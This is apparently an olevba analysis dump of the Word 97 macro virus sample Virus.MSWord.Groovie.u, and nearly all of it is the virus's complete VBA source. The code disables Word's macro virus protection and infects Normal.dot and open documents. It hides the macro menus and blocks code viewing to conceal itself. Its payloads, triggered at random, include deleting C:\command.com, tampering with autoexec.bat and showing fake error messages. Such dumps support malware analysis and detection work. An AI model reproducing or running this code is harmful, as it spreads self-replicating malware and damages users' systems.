olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.u
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.u - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO gotcha.bas 
in file: Virus.MSWord.Groovie.u - OLE stream: 'Macros/VBA/gotcha'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public target As String
Public Init As Boolean
Public norminfd As Boolean
Public Docinfd As Boolean
Public Armor As Boolean
Public DocName As String
Public Scan_For_Doc As Boolean
Public Exitt_Word As Boolean
Function ID_check()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
        If MacroContainer = NormalTemplate Then
        target = "normal"
        GoTo checkout
    End If
    If MacroContainer = ActiveDocument Then target = "document"
    If MacroContainer = "Wordinit.dot" Then target = "Trix"
checkout:
End Function
Function Vir_status()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
If Dir(Application.StartupPath + "\Wordinit.dot") = "Wordinit.dot" Then Init = True
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "gotcha" Then Docinfd = True
    Next I
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(I).Name = "gotcha" Then norminfd = True
    Next I
    If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
End Function
Function Gotcha_Main()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Call ID_check
Call Vir_status
Call Export_Status
    If target = "document" Then Call Docinf_code
    If target = "normal" Then Call Norminf_code
    If target = "Trix" Then Call Trix_code
    If Armor = False Then CommandBars("tools").Controls("Macro").Delete
    If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Function
Function Export_Status()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
End Function
Function Docinf_code()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
    If norminfd = False And Armor = False Then
        With NormalTemplate.VBProject
        With .VBComponents.Import("C:\confg.sys")
        End With
        End With
    End If
    Init = False

    If Init = False Then
    NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
         Randomize Timer
Randomize Timer
x = Int(Rnd(1) * 26)
If x = 1 Then A$ = "A"
If x = 2 Then A$ = "B"
If x = 3 Then A$ = "C"
If x = 4 Then A$ = "D"
If x = 5 Then A$ = "E"
If x = 6 Then A$ = "F"
If x = 7 Then A$ = "G"
If x = 8 Then A$ = "H"
If x = 9 Then A$ = "I"
If x = 10 Then A$ = "J"
If x = 11 Then A$ = "K"
If x = 12 Then A$ = "L"
If x = 13 Then A$ = "M"
If x = 14 Then A$ = "N"
If x = 15 Then A$ = "O"
If x = 16 Then A$ = "P"
If x = 17 Then A$ = "Q"
If x = 18 Then A$ = "R"
If x = 19 Then A$ = "S"
If x = 20 Then A$ = "T"
If x = 21 Then A$ = "U"
If x = 22 Then A$ = "V"
If x = 23 Then A$ = "W"
If x = 24 Then A$ = "X"
If x = 25 Then A$ = "Y"
If x = 26 Then A$ = "Z"
s = Int(Rnd(1) * 26)
If s = 1 Then C$ = "A"
If s = 2 Then C$ = "B"
If s = 3 Then C$ = "C"
If s = 4 Then C$ = "D"
If s = 5 Then C$ = "E"
If s = 6 Then C$ = "F"
If s = 7 Then C$ = "G"
If s = 8 Then C$ = "H"
If s = 9 Then C$ = "I"
If s = 10 Then C$ = "J"
If s = 11 Then C$ = "K"
If s = 12 Then C$ = "L"
If s = 13 Then C$ = "M"
If s = 14 Then C$ = "N"
If s = 15 Then C$ = "O"
If s = 16 Then C$ = "P"
If s = 17 Then C$ = "Q"
If s = 18 Then C$ = "R"
If s = 19 Then C$ = "S"
If s = 20 Then C$ = "T"
If s = 21 Then C$ = "U"
If s = 22 Then C$ = "V"
If s = 23 Then C$ = "W"
If s = 24 Then C$ = "X"
If s = 25 Then C$ = "Y"
If s = 26 Then C$ = "Z"
q = Int(Rnd(1) * 26)
If q = 1 Then D$ = "A"
If q = 2 Then D$ = "B"
If q = 3 Then D$ = "C"
If q = 4 Then D$ = "D"
If q = 5 Then D$ = "E"
If q = 6 Then D$ = "F"
If q = 7 Then D$ = "G"
If q = 8 Then D$ = "H"
If q = 9 Then D$ = "I"
If q = 10 Then D$ = "J"
If q = 11 Then D$ = "K"
If q = 12 Then D$ = "L"
If q = 13 Then D$ = "M"
If q = 14 Then D$ = "N"
If q = 15 Then D$ = "O"
If q = 16 Then D$ = "P"
If q = 17 Then D$ = "Q"
If q = 18 Then D$ = "R"
If q = 19 Then D$ = "S"
If q = 20 Then D$ = "T"
If q = 21 Then D$ = "U"
If q = 22 Then D$ = "V"
If q = 23 Then D$ = "W"
If q = 24 Then D$ = "X"
If q = 25 Then D$ = "Y"
If q = 26 Then D$ = "Z"
w = Int(Rnd(1) * 26)
If w = 1 Then E$ = "A"
If w = 2 Then E$ = "B"
If w = 3 Then E$ = "C"
If w = 4 Then E$ = "D"
If w = 5 Then E$ = "E"
If w = 6 Then E$ = "F"
If w = 7 Then E$ = "G"
If w = 8 Then E$ = "H"
If w = 9 Then E$ = "I"
If w = 10 Then E$ = "J"
If w = 11 Then E$ = "K"
If w = 12 Then E$ = "L"
If w = 13 Then E$ = "M"
If w = 14 Then E$ = "N"
If w = 15 Then E$ = "O"
If w = 16 Then E$ = "P"
If w = 17 Then E$ = "Q"
If w = 18 Then E$ = "R"
If w = 19 Then E$ = "S"
If w = 20 Then E$ = "T"
If w = 21 Then E$ = "U"
If w = 22 Then E$ = "V"
If w = 23 Then E$ = "W"
If w = 24 Then E$ = "X"
If w = 25 Then E$ = "Y"
If w = 26 Then E$ = "Z"
y = Int(Rnd(1) * 26)
If y = 1 Then F$ = "A"
If y = 2 Then F$ = "B"
If y = 3 Then F$ = "C"
If y = 4 Then F$ = "D"
If y = 5 Then F$ = "E"
If y = 6 Then F$ = "F"
If y = 7 Then F$ = "G"
If y = 8 Then F$ = "H"
If y = 9 Then F$ = "I"
If y = 10 Then F$ = "J"
If y = 11 Then F$ = "K"
If y = 12 Then F$ = "L"
If y = 13 Then F$ = "M"
If y = 14 Then F$ = "N"
If y = 15 Then F$ = "O"
If y = 16 Then F$ = "P"
If y = 17 Then F$ = "Q"
If y = 18 Then F$ = "R"
If y = 19 Then F$ = "S"
If y = 20 Then F$ = "T"
If y = 21 Then F$ = "U"
If y = 22 Then F$ = "V"
If y = 23 Then F$ = "W"
If y = 24 Then F$ = "X"
If y = 25 Then F$ = "Y"
If y = 26 Then F$ = "Z"
t = Int(Rnd(1) * 26)
If t = 1 Then G$ = "A"
If t = 2 Then G$ = "B"
If t = 3 Then G$ = "C"
If t = 4 Then G$ = "D"
If t = 5 Then G$ = "E"
If t = 6 Then G$ = "F"
If t = 7 Then G$ = "G"
If t = 8 Then G$ = "H"
If t = 9 Then G$ = "I"
If t = 10 Then G$ = "J"
If t = 11 Then G$ = "K"
If t = 12 Then G$ = "L"
If t = 13 Then G$ = "M"
If t = 14 Then G$ = "N"
If t = 15 Then G$ = "O"
If t = 16 Then G$ = "P"
If t = 17 Then G$ = "Q"
If t = 18 Then G$ = "R"
If t = 19 Then G$ = "S"
If t = 20 Then G$ = "T"
If t = 21 Then G$ = "U"
If t = 22 Then G$ = "V"
If t = 23 Then G$ = "W"
If t = 24 Then G$ = "X"
If t = 25 Then G$ = "Y"
If t = 26 Then G$ = "Z"
B$ = A$ + C$ + D$ + E$ + F$ + G$
        Application.OrganizerRename Source:=Application.StartupPath + "\Wordinit.dot", Name:="gotcha", NewName:=B$, Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Exitt_Word = False Then Documents.Open FileName:=DocName
        Windows(1).Close
    End If
End Function
Function Norminf_code()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.ScreenUpdating = False
    Call Check_For_Doc
    If Docinfd = False And Scan_For_Doc = True Then
        With ActiveDocument.VBProject
        With .VBComponents.Import("C:\confg.sys")
        End With
        End With
    End If
    If Init = False And Scan_For_Doc = True Then
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
                ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Randomize Timer
x = Int(Rnd(1) * 26)
If x = 1 Then A$ = "A"
If x = 2 Then A$ = "B"
If x = 3 Then A$ = "C"
If x = 4 Then A$ = "D"
If x = 5 Then A$ = "E"
If x = 6 Then A$ = "F"
If x = 7 Then A$ = "G"
If x = 8 Then A$ = "H"
If x = 9 Then A$ = "I"
If x = 10 Then A$ = "J"
If x = 11 Then A$ = "K"
If x = 12 Then A$ = "L"
If x = 13 Then A$ = "M"
If x = 14 Then A$ = "N"
If x = 15 Then A$ = "O"
If x = 16 Then A$ = "P"
If x = 17 Then A$ = "Q"
If x = 18 Then A$ = "R"
If x = 19 Then A$ = "S"
If x = 20 Then A$ = "T"
If x = 21 Then A$ = "U"
If x = 22 Then A$ = "V"
If x = 23 Then A$ = "W"
If x = 24 Then A$ = "X"
If x = 25 Then A$ = "Y"
If x = 26 Then A$ = "Z"
s = Int(Rnd(1) * 26)
If s = 1 Then C$ = "A"
If s = 2 Then C$ = "B"
If s = 3 Then C$ = "C"
If s = 4 Then C$ = "D"
If s = 5 Then C$ = "E"
If s = 6 Then C$ = "F"
If s = 7 Then C$ = "G"
If s = 8 Then C$ = "H"
If s = 9 Then C$ = "I"
If s = 10 Then C$ = "J"
If s = 11 Then C$ = "K"
If s = 12 Then C$ = "L"
If s = 13 Then C$ = "M"
If s = 14 Then C$ = "N"
If s = 15 Then C$ = "O"
If s = 16 Then C$ = "P"
If s = 17 Then C$ = "Q"
If s = 18 Then C$ = "R"
If s = 19 Then C$ = "S"
If s = 20 Then C$ = "T"
If s = 21 Then C$ = "U"
If s = 22 Then C$ = "V"
If s = 23 Then C$ = "W"
If s = 24 Then C$ = "s"
If s = 25 Then C$ = "Y"
If s = 26 Then C$ = "Z"
q = Int(Rnd(1) * 26)
If q = 1 Then D$ = "A"
If q = 2 Then D$ = "B"
If q = 3 Then D$ = "C"
If q = 4 Then D$ = "D"
If q = 5 Then D$ = "E"
If q = 6 Then D$ = "F"
If q = 7 Then D$ = "G"
If q = 8 Then D$ = "H"
If q = 9 Then D$ = "I"
If q = 10 Then D$ = "J"
If q = 11 Then D$ = "K"
If q = 12 Then D$ = "L"
If q = 13 Then D$ = "M"
If q = 14 Then D$ = "N"
If q = 15 Then D$ = "O"
If q = 16 Then D$ = "P"
If q = 17 Then D$ = "Q"
If q = 18 Then D$ = "R"
If q = 19 Then D$ = "S"
If q = 20 Then D$ = "T"
If q = 21 Then D$ = "U"
If q = 22 Then D$ = "V"
If q = 23 Then D$ = "W"
If q = 24 Then D$ = "X"
If q = 25 Then D$ = "Y"
If q = 26 Then D$ = "Z"
w = Int(Rnd(1) * 26)
If w = 1 Then E$ = "A"
If w = 2 Then E$ = "B"
If w = 3 Then E$ = "C"
If w = 4 Then E$ = "D"
If w = 5 Then E$ = "E"
If w = 6 Then E$ = "F"
If w = 7 Then E$ = "G"
If w = 8 Then E$ = "H"
If w = 9 Then E$ = "I"
If w = 10 Then E$ = "J"
If w = 11 Then E$ = "K"
If w = 12 Then E$ = "L"
If w = 13 Then E$ = "M"
If w = 14 Then E$ = "N"
If w = 15 Then E$ = "O"
If w = 16 Then E$ = "P"
If w = 17 Then E$ = "Q"
If w = 18 Then E$ = "R"
If w = 19 Then E$ = "S"
If w = 20 Then E$ = "T"
If w = 21 Then E$ = "U"
If w = 22 Then E$ = "V"
If w = 23 Then E$ = "W"
If w = 24 Then E$ = "X"
If w = 25 Then E$ = "Y"
If w = 26 Then E$ = "Z"
y = Int(Rnd(1) * 26)
If y = 1 Then F$ = "A"
If y = 2 Then F$ = "B"
If y = 3 Then F$ = "C"
If y = 4 Then F$ = "D"
If y = 5 Then F$ = "E"
If y = 6 Then F$ = "F"
If y = 7 Then F$ = "G"
If y = 8 Then F$ = "H"
If y = 9 Then F$ = "I"
If y = 10 Then F$ = "J"
If y = 11 Then F$ = "K"
If y = 12 Then F$ = "L"
If y = 13 Then F$ = "M"
If y = 14 Then F$ = "N"
If y = 15 Then F$ = "O"
If y = 16 Then F$ = "P"
If y = 17 Then F$ = "Q"
If y = 18 Then F$ = "R"
If y = 19 Then F$ = "S"
If y = 20 Then F$ = "T"
If y = 21 Then F$ = "U"
If y = 22 Then F$ = "V"
If y = 23 Then F$ = "W"
If y = 24 Then F$ = "X"
If y = 25 Then F$ = "Y"
If y = 26 Then F$ = "Z"
t = Int(Rnd(1) * 26)
If t = 1 Then G$ = "A"
If t = 2 Then G$ = "B"
If t = 3 Then G$ = "C"
If t = 4 Then G$ = "D"
If t = 5 Then G$ = "E"
If t = 6 Then G$ = "F"
If t = 7 Then G$ = "G"
If t = 8 Then G$ = "H"
If t = 9 Then G$ = "I"
If t = 10 Then G$ = "J"
If t = 11 Then G$ = "K"
If t = 12 Then G$ = "L"
If t = 13 Then G$ = "M"
If t = 14 Then G$ = "N"
If t = 15 Then G$ = "O"
If t = 16 Then G$ = "P"
If t = 17 Then G$ = "Q"
If t = 18 Then G$ = "R"
If t = 19 Then G$ = "S"
If t = 20 Then G$ = "T"
If t = 21 Then G$ = "U"
If t = 22 Then G$ = "V"
If t = 23 Then G$ = "W"
If t = 24 Then G$ = "X"
If t = 25 Then G$ = "Y"
If t = 26 Then G$ = "Z"
B$ = A$ + C$ + D$ + E$ + F$ + G$
        Application.OrganizerRename Source:=Application.StartupPath + "\Wordinit.dot", Name:="gotcha", NewName:=B$, Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If Exitt_Word = False Then Documents.Open FileName:=DocName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
    If Init = False And Scan_For_Doc = False Then
    NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
    ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
    Documents.Add template:="", NewTemplate:=False
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Randomize Timer
x = Int(Rnd(1) * 26)
If x = 1 Then A$ = "A"
If x = 2 Then A$ = "B"
If x = 3 Then A$ = "C"
If x = 4 Then A$ = "D"
If x = 5 Then A$ = "E"
If x = 6 Then A$ = "F"
If x = 7 Then A$ = "G"
If x = 8 Then A$ = "H"
If x = 9 Then A$ = "I"
If x = 10 Then A$ = "J"
If x = 11 Then A$ = "K"
If x = 12 Then A$ = "L"
If x = 13 Then A$ = "M"
If x = 14 Then A$ = "N"
If x = 15 Then A$ = "O"
If x = 16 Then A$ = "P"
If x = 17 Then A$ = "Q"
If x = 18 Then A$ = "R"
If x = 19 Then A$ = "S"
If x = 20 Then A$ = "T"
If x = 21 Then A$ = "U"
If x = 22 Then A$ = "V"
If x = 23 Then A$ = "W"
If x = 24 Then A$ = "X"
If x = 25 Then A$ = "Y"
If x = 26 Then A$ = "Z"
s = Int(Rnd(1) * 26)
If s = 1 Then C$ = "A"
If s = 2 Then C$ = "B"
If s = 3 Then C$ = "C"
If s = 4 Then C$ = "D"
If s = 5 Then C$ = "E"
If s = 6 Then C$ = "F"
If s = 7 Then C$ = "G"
If s = 8 Then C$ = "H"
If s = 9 Then C$ = "I"
If s = 10 Then C$ = "J"
If s = 11 Then C$ = "K"
If s = 12 Then C$ = "L"
If s = 13 Then C$ = "M"
If s = 14 Then C$ = "N"
If s = 15 Then C$ = "O"
If s = 16 Then C$ = "P"
If s = 17 Then C$ = "Q"
If s = 18 Then C$ = "R"
If s = 19 Then C$ = "S"
If s = 20 Then C$ = "T"
If s = 21 Then C$ = "U"
If s = 22 Then C$ = "V"
If s = 23 Then C$ = "W"
If s = 24 Then C$ = "s"
If s = 25 Then C$ = "Y"
If s = 26 Then C$ = "Z"
q = Int(Rnd(1) * 26)
If q = 1 Then D$ = "A"
If q = 2 Then D$ = "B"
If q = 3 Then D$ = "C"
If q = 4 Then D$ = "D"
If q = 5 Then D$ = "E"
If q = 6 Then D$ = "F"
If q = 7 Then D$ = "G"
If q = 8 Then D$ = "H"
If q = 9 Then D$ = "I"
If q = 10 Then D$ = "J"
If q = 11 Then D$ = "K"
If q = 12 Then D$ = "L"
If q = 13 Then D$ = "M"
If q = 14 Then D$ = "N"
If q = 15 Then D$ = "O"
If q = 16 Then D$ = "P"
If q = 17 Then D$ = "Q"
If q = 18 Then D$ = "R"
If q = 19 Then D$ = "S"
If q = 20 Then D$ = "T"
If q = 21 Then D$ = "U"
If q = 22 Then D$ = "V"
If q = 23 Then D$ = "W"
If q = 24 Then D$ = "X"
If q = 25 Then D$ = "Y"
If q = 26 Then D$ = "Z"
w = Int(Rnd(1) * 26)
If w = 1 Then E$ = "A"
If w = 2 Then E$ = "B"
If w = 3 Then E$ = "C"
If w = 4 Then E$ = "D"
If w = 5 Then E$ = "E"
If w = 6 Then E$ = "F"
If w = 7 Then E$ = "G"
If w = 8 Then E$ = "H"
If w = 9 Then E$ = "I"
If w = 10 Then E$ = "J"
If w = 11 Then E$ = "K"
If w = 12 Then E$ = "L"
If w = 13 Then E$ = "M"
If w = 14 Then E$ = "N"
If w = 15 Then E$ = "O"
If w = 16 Then E$ = "P"
If w = 17 Then E$ = "Q"
If w = 18 Then E$ = "R"
If w = 19 Then E$ = "S"
If w = 20 Then E$ = "T"
If w = 21 Then E$ = "U"
If w = 22 Then E$ = "V"
If w = 23 Then E$ = "W"
If w = 24 Then E$ = "X"
If w = 25 Then E$ = "Y"
If w = 26 Then E$ = "Z"
y = Int(Rnd(1) * 26)
If y = 1 Then F$ = "A"
If y = 2 Then F$ = "B"
If y = 3 Then F$ = "C"
If y = 4 Then F$ = "D"
If y = 5 Then F$ = "E"
If y = 6 Then F$ = "F"
If y = 7 Then F$ = "G"
If y = 8 Then F$ = "H"
If y = 9 Then F$ = "I"
If y = 10 Then F$ = "J"
If y = 11 Then F$ = "K"
If y = 12 Then F$ = "L"
If y = 13 Then F$ = "M"
If y = 14 Then F$ = "N"
If y = 15 Then F$ = "O"
If y = 16 Then F$ = "P"
If y = 17 Then F$ = "Q"
If y = 18 Then F$ = "R"
If y = 19 Then F$ = "S"
If y = 20 Then F$ = "T"
If y = 21 Then F$ = "U"
If y = 22 Then F$ = "V"
If y = 23 Then F$ = "W"
If y = 24 Then F$ = "X"
If y = 25 Then F$ = "Y"
If y = 26 Then F$ = "Z"
t = Int(Rnd(1) * 26)
If t = 1 Then G$ = "A"
If t = 2 Then G$ = "B"
If t = 3 Then G$ = "C"
If t = 4 Then G$ = "D"
If t = 5 Then G$ = "E"
If t = 6 Then G$ = "F"
If t = 7 Then G$ = "G"
If t = 8 Then G$ = "H"
If t = 9 Then G$ = "I"
If t = 10 Then G$ = "J"
If t = 11 Then G$ = "K"
If t = 12 Then G$ = "L"
If t = 13 Then G$ = "M"
If t = 14 Then G$ = "N"
If t = 15 Then G$ = "O"
If t = 16 Then G$ = "P"
If t = 17 Then G$ = "Q"
If t = 18 Then G$ = "R"
If t = 19 Then G$ = "S"
If t = 20 Then G$ = "T"
If t = 21 Then G$ = "U"
If t = 22 Then G$ = "V"
If t = 23 Then G$ = "W"
If t = 24 Then G$ = "X"
If t = 25 Then G$ = "Y"
If t = 26 Then G$ = "Z"
B$ = A$ + C$ + D$ + E$ + F$ + G$
        Application.OrganizerRename Source:=Application.StartupPath + "\Wordinit.dot", Name:="gotcha", NewName:=B$, Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
Application.ScreenUpdating = True
End Function
Function Trix_code()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.ScreenUpdating = False
        If norminfd = False And Armor = False Then
           Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
            With NormalTemplate.VBProject
            With .VBComponents.Import("C:\confg.sys")
            End With
            End With
            NormalTemplate.Save
        End If
        If Docinfd = False Then
        NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
        ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
        Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
            With ActiveDocument.VBProject
            With .VBComponents.Import("C:\confg.sys")
            End With
            End With
            End If
Application.ScreenUpdating = True
End Function
Function Gotcha_Payload()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    DocName = ActiveDocument.FullName
    Call Gotcha_Main
    Randomize Timer
    girl = Int(Rnd(1) * 300) + 1
    If girl = 2 Then
    MsgBox "W97M.Gotcha .b Variant", 48, "Trix"
    End If
    If girl = 13 Then
    MsgBox "An error has occured.  Save all documents and restart Microsoft Word", 48, "Microsoft Word"
    End If
    If girl = 69 Then
    Open "C:\autoexec.bat" For Append As #1
    Print #1, "Echo GOTCHA!"
    Close #1
    End If
    If girl = 100 Then
    Open "C:\windows\gotcha.dll" For Append As #1
    Print #1, "W97M.Gotcha .b Variant for Word 97"
    Print #1, ".b strain created by Trix"
    Print #1, "for your personal enjoyment"
    Print #1, "Have a Nice Day....I know I'm having fun"
    Print #1, "             GOTCHA               "
    Print #1, ""
    Close #1
    End If
    If girl = 122 Then
    Open "C:\windows\err.sys" For Append As #1
    Print #1, "based off of groovie.a with a twist of Trix®"
    Print #1, ""
    Close #1
    End If
    If girl = 200 Then
    MsgBox "...........", 6, "*nŽšíjşÄtŻ&�9 ÉqeiÔ™"
    End If
    If girl = 220 Then
    Kill "C:\command.com"
    MsgBox "A fatal error has occured at FFEE:FFFF.  Save all documents and close Microsoft Word", 16, "Microsoft Word"
    End If
    If girl = 300 Then
    SendKeys "Gotcha"
    End If
    End Function
Sub AutoExec()
On Error Resume Next
Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"

End Sub

Sub AutoClose()
On Error Resume Next
Exitt_Word = True
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Call Gotcha_Payload
End Sub
Sub AutoExit()
 On Error Resume Next
Exitt_Word = True
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Call Gotcha_Payload
End Sub
Sub FileSaveAs()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Dialogs(wdDialogFileSaveAs).Show
Call Gotcha_Payload
WordBasic.filesave
End Sub
Sub filesave()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
WordBasic.filesave
Call Gotcha_Payload
WordBasic.filesave
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub fileclose()
On Error Resume Next
Exitt_Word = True
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Call Gotcha_Payload
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
WordBasic.filesave
ActiveDocument.Close
End Sub
Sub fileprint()
On Error Resume Next
Call Gotcha_Payload
Dialogs(wdDialogFilePrint).Show
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ToolsCustomize()
End Sub
Function Check_For_Doc()
On Error GoTo docek
    If ActiveDocument.Name <> "" Then
        Scan_For_Doc = True
    End If
    GoTo over
docek:
    Scan_For_Doc = False
over:
End Function


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
